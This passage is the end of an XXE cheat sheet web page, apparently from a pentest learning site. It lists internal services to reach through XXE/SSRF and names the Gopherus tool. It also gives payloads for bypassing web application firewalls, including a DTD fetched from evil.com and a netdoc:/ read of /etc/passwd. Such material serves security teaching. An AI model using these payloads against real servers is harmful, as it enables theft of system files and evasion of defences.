In case of Response based XXE, we can use unauthenticated DB API calls such as Couch DB API, Mongo DB.
		- https://www.netsparker.com/blog/web-security/exploiting-csrf-vulnerability-mongodb-rest-api/
		- https://hackerone.com/reports/398641

Memcached - Port 11211
		- https://medium.com/@d0znpp/ssrf-memcached-and-other-key-value-injections-in-the-wild-c8d223bd856f11211

Zabbix - Port 10050
		- https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit (Zabbix Agentd)

Solr- Port 8983
		- https://github.com/artsploit/solr-injection
</pre>
Also check out this great tool for exploiting such services: https://github.com/tarunkant/Gopherus using gopher://<br><br>
<h3>XXE WAF Bypass</h3>
&lt;!ENTITY xxe SYSTEM "URL"&gt; Usually "SYSTEM" keyword is blocked by many WAFs, In such case you can use "PUBLIC" keyword as an alternative which has helped to bypass WAFs and Exploit XXEs as SYSTEM and PUBLIC are practically synonyms<br><br>
Using "PUBLIC" or Parameter Entities<pre>&lt;!ENTITY % xxe PUBLIC "Random Text" "URL"&gt;</pre>
General Entites:<pre>&lt;!ENTITY xxe PUBLIC "Any TEXT" "URL"&gt;</pre>
change encoding for example on UTF-16, UTF-7, etc.<pre>&lt;?xml version="1.0" encoding="UTF-16"?&gt; and then you can put the content of XML as of UTF-16 character set which would not be detected by WAFs.</pre>
tampering with doctype/entity names (XXE payloads):
<pre>&lt;!DOCTYPE :. SYSTEM "http://"
&lt;!DOCTYPE :_-_: SYSTEM "http://"
&lt;!DOCTYPE {0xdfbf} SYSTEM "http://"
Remove &lt;?xml version="1.0" encoding="UTF-16"?&gt;
This is has worked for me numerous times as many WAF blocks "&lt;?xml" or just "&lt;?" together. However, removing doesn't cause issue with the parsers usually.</pre>
Adding space before the protocol<pre> &lt;!DOCTYPE :. SYTEM " http://evil.com/1.dtd"</pre>
Use netdoc:/ in place of file:///<pre>&lt;!ENTITY % data SYSTEM "netdoc:/etc/passwd"&gt;</pre>
Labs<br>
====<br>
<a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files</a><br><img src="../../post_images/mqdefault.png" width=0>
<br>Author : Rahul & Faraz <br>Date : 2019-10-16</span><br><br></div><div id="disqus_thread"></div>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html";  
this.page.identifier = "64";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="XXE-Cheat-Sheet-by-SecurityIdiots.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
<h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="86e7e2ebefe8c6f5e3e5f3f4eff2ffefe2efe9f2f5a8e5e9eb">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>